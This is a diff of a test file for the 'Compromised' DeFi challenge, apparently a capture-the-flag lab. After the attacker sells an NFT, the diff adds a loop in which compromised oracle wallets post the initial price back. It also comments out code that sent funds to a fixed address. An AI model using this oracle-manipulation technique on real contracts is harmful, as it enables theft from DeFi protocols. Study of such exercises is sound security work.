@@ -101,23 +101,26 @@ describe('Compromised challenge', function () {
 		await this.nftToken.connect(attacker).approve(this.exchange.address,tokenId);
 		await this.exchange.connect(attacker).sellOne(tokenId);
 
+        for (let i = 0; i < wallets.length; i++) {
+			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol,INITIAL_NFT_PRICE);
+        }
 
-        const myBalance = await ethers.provider.getBalance(attacker.address);
-        const gasForTransaction = 21000;
+        // const myBalance = await ethers.provider.getBalance(attacker.address);
+        // const gasForTransaction = 21000;
 
-        const gasPrice = await ethers.provider.getGasPrice();
-        const gasEstimate = await attacker.estimateGas({
-                to: "0xA73209FB1a42495120166736362A1DfA9F95A105",
-                value: myBalance.sub(21000)
-        });
+        // const gasPrice = await ethers.provider.getGasPrice();
+        // const gasEstimate = await attacker.estimateGas({
+        //         to: "0xA73209FB1a42495120166736362A1DfA9F95A105",
+        //         value: myBalance.sub(21000)
+        // });
 
-        console.log("gas estimate: %s ,  gasprice: %s ",gasEstimate, gasPrice)
+        // console.log("gas estimate: %s ,  gasprice: %s ",gasEstimate, gasPrice)
 
-        const amountToSend = myBalance.sub(myBalance.div(10).sub(gasPrice.mul(gasForTransaction)))
-        const tx1 = attacker.sendTransaction({
-            to: "0xA73209FB1a42495120166736362A1DfA9F95A105",
-            value: myBalance.div(10)
-        });
+        // const amountToSend = myBalance.sub(myBalance.div(10).sub(gasPrice.mul(gasForTransaction)))
+        // const tx1 = attacker.sendTransaction({
+        //     to: "0xA73209FB1a42495120166736362A1DfA9F95A105",
+        //     value: myBalance.div(10)
+        // });
     });
 
     after(async function () {
